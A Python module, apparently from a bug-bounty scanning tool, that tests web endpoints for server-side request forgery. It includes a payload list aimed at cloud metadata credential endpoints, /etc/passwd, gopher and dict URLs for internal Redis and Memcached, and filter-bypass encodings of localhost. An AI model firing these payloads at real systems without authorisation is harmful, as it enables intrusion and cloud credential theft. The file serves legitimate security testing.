"""
SSRF (Server-Side Request Forgery) Scanner
============================================

Tests for SSRF by injecting URLs pointing to controlled/detectable endpoints.
"""

from __future__ import annotations

import asyncio
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from bbhunter.engines.scanner.base_scanner import BaseScanner
from bbhunter.logger import get_logger
from bbhunter.models import Endpoint, Severity, Vulnerability, VulnCategory

logger = get_logger()


class SSRFScanner(BaseScanner):
    """Server-Side Request Forgery scanner."""

    CATEGORY = VulnCategory.SSRF

    PAYLOADS = [
        # Localhost access
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/api/token",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # Internal network
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://192.168.0.1",
        # DNS rebinding / bypass
        "http://127.0.0.1.nip.io",
        "http://0x7f000001",
        "http://2130706433",  # decimal for 127.0.0.1
        # Protocol handling
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/",
        "gopher://127.0.0.1:6379/",
    ]

    # Parameters commonly vulnerable to SSRF
    SSRF_PARAMS = [
        "url", "uri", "path", "src", "source", "dest", "destination",
        "redirect", "redirect_url", "redirect_uri", "callback",
        "next", "data", "reference", "site", "html", "val",
        "validate", "domain", "feed", "host", "port", "to",
        "out", "view", "dir", "show", "navigation", "open",
        "file", "document", "folder", "pg", "style", "pdf",
        "template", "php_path", "doc", "page", "image", "img",
        "return", "return_url", "fetch", "proxy", "link",
    ]

    # Patterns in response indicating successful SSRF
    SSRF_INDICATORS = [
        "root:x:",                      # /etc/passwd
        "ami-id",                        # AWS metadata
        "instance-id",                   # Cloud metadata
        "computeMetadata",               # GCP metadata
        "169.254.169.254",               # Cloud metadata IP
        "localhost",                      # Local access
        "127.0.0.1",                     # Loopback
        "internal server",               # Internal access error
    ]

    async def scan(
        self,
        endpoints: list[Endpoint],
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Scan for SSRF vulnerabilities."""
        vulnerabilities: list[Vulnerability] = []
        
        for endpoint in endpoints:
            for param in endpoint.parameters:
                if param.name.lower() in self.SSRF_PARAMS:
                    vulns = await self._test_parameter(
                        endpoint, param.name, target_id, scan_id
                    )
                    vulnerabilities.extend(vulns)

        return vulnerabilities

    async def _test_parameter(
        self,
        endpoint: Endpoint,
        param_name: str,
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Test a URL-type parameter for SSRF."""
        vulns = []
        parsed = urlparse(endpoint.url)

        for payload in self.PAYLOADS:
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            resp = await self._send_request(test_url)
            if resp is None:
                continue

            body = resp.text.lower()

            for indicator in self.SSRF_INDICATORS:
                if indicator.lower() in body:
                    vuln = self._create_vulnerability(
                        target_id=target_id,
                        scan_id=scan_id,
                        title=f"Server-Side Request Forgery (SSRF) via '{param_name}'",
                        severity=Severity.HIGH if "metadata" in payload else Severity.MEDIUM,
                        url=endpoint.url,
                        parameter=param_name,
                        payload=payload,
                        evidence=body[:500],
                        description=(
                            f"The parameter '{param_name}' is vulnerable to SSRF. "
                            f"The server fetches attacker-controlled URLs, potentially "
                            f"allowing access to internal services and cloud metadata."
                        ),
                        impact=(
                            "Access to internal services, cloud metadata (AWS/GCP/Azure credentials), "
                            "port scanning of internal networks, potential remote code execution."
                        ),
                        remediation=(
                            "Validate and whitelist allowed URLs/domains. "
                            "Block access to internal IP ranges and cloud metadata endpoints. "
                            "Use a URL parser to prevent bypass techniques. "
                            "Implement network segmentation."
                        ),
                        confidence=0.75,
                        steps=[
                            f"Inject SSRF payload into '{param_name}': {payload}",
                            f"Request URL: {test_url}",
                            f"Response contains indicator: {indicator}",
                        ],
                    )
                    vulns.append(vuln)
                    return vulns  # Confirmed

        return vulns
